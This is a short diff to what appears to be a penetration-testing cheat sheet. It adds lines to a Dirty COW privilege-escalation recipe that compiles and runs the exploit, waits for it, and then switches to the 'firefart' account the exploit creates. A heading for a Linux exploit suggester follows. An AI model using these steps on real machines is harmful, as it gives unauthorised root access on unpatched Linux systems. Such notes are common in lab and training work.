@@ -1188,6 +1188,10 @@ paste in code
 mv dirtycow.txt dirtycow.c
 gcc -pthread dirtycow.c  -o dirty -lcrypt
 ./dirty
+
+script may take a few minutes to complete
+su firefart
+
 ```
 ### Linux exploit suggester
 ```
